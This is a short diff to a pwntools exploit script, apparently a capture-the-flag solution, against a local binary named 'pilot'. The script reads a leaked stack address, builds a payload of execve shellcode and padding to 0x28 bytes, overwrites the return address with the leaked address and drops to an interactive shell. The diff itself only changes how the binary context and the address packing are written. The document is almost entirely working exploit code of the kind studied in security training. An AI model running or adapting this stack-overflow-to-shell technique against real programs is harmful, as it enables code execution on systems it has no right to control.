@@ -2,7 +2,7 @@
 
 from pwn import *
 
-target = process('./pilot')
+context.binary = target = process('./pilot')
 
 print target.recvuntil("[*]Leak addr :")
 
@@ -20,7 +20,7 @@ payload += "\x31\xf6\x48\xbf\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdf\xf7\xe6
 payload += "0"*(0x28 - len(payload))
 
 # Overwrite the return address with the address of the start of our input
-payload += p64(inputAdr)
+payload += pack(inputAdr)
 
 # Send the payload, drop to an interactive shell to use the shell we pop
 target.send(payload)
